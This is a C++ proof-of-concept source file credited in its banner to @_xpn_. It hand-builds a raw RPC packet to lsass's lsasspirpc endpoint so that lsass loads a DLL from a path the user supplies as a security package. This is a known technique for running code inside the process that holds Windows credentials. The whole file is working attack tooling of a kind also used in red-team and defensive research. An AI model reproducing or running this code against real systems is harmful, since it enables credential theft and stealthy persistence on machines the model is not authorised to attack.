#define SECURITY_WIN32
#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <Windows.h>
#include <subauth.h>
#include <sspi.h>
#include <Dbghelp.h>
#include "sspi_h.h"

#pragma comment(lib, "Rpcrt4.lib")

int main(int argc, char **argv) {
	RPC_STATUS status;
	UNICODE_STRING packageName;
	UWORD packetLen = 0;
	unsigned char* pszStringBinding = NULL;
	unsigned long ulCode;
	unsigned long long unk1;
	unsigned char rpcPacket[0x2000];
	long out1 = 0, out2 = 0;
	void* out3 = (void*)0;
	struct Struct_144_t out4;

	printf("\nAddSecurityPackage Raw RPC Example... by @_xpn_\n\n");

	if (argc != 2) {
		printf("Usage: %s PACKAGE_PATH\n", argv[0]);
		return 1;
	}

	printf("[*] Building RPC packet\n");

	// Init RPC packet
	memset(&packageName, 0, sizeof(packageName));
	memset(rpcPacket, 0, sizeof(rpcPacket));

	// Build DLL to be loaded by lsass
	packageName.Length = strlen(argv[1]) * 2;
	packageName.MaximumLength = (strlen(argv[1]) * 2) + 2;
	mbstowcs((wchar_t*)(rpcPacket + 0xd8), argv[1], (sizeof(rpcPacket) - 0xd8) / 2);
	packetLen = 0xd8 + packageName.MaximumLength;

	// Complete RPC packet fields
	*(unsigned long long*)rpcPacket = 0xc4; // ??
	*(unsigned short*)(rpcPacket + 2) = packetLen; // Length of packet
	*(unsigned long long*)((char*)rpcPacket + 8) = GetCurrentProcessId();  // Process ID
	*(unsigned long long*)((char*)rpcPacket + 16) = GetCurrentThreadId();  //Thread ID
	*(unsigned long long*)((char*)rpcPacket + 0x28) = 0x0b;  // RPC call ID
	*(void**)((char*)rpcPacket + 0xd0) = &unk1; // ??

	// Copy package name into RPC packet
	memcpy(rpcPacket + 0x40, &packageName, 8);
	*(unsigned long long*)((char*)rpcPacket + 0x48) = 0xd8;  // Offset to unicode ssp name

	// Create the RPC connection string
	status = RpcStringBindingComposeA(NULL,
		(unsigned char*)"ncalrpc",
		NULL,
		(unsigned char*)"lsasspirpc",
		NULL,
		&pszStringBinding);
	if (status) {
		return 1;
	}
	
	// Create RPC handle
	printf("[*] Connecting to lsasspirpc RPC service\n");
	status = RpcBindingFromStringBindingA(pszStringBinding, &default_IfHandle);
	if (status) {
		return 1;
	}

	memset(&out4, 0, sizeof(out4));

	RpcTryExcept
	{
		// Create our RPC context handle
		printf("[*] Sending SspirConnectRpc call\n");
		long ret = Proc0_SspirConnectRpc((unsigned char *)NULL, 2, &out1, &out2, &out3);

	    // Make the "AddSecurityPackage" call directly via RPC
		printf("[*] Sending SspirCallRpc call\n");
		ret = Proc3_SspirCallRpc(out3, packetLen, rpcPacket, &out2, (unsigned char **)&out3, &out4);
	}
	RpcExcept(1)
	{
		ulCode = RpcExceptionCode();
		if (ulCode == 0x6c6) {
			printf("[*] Error code 0x6c6 returned, which is expected if DLL load returns FALSE\n");
		}
		else {
			printf("[!] Error code %x received\n", ulCode);
		}
	}
	RpcEndExcept

	return 0;
}

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t len)
{
	return(malloc(len));
}

void __RPC_USER midl_user_free(void __RPC_FAR* ptr)
{
	free(ptr);
}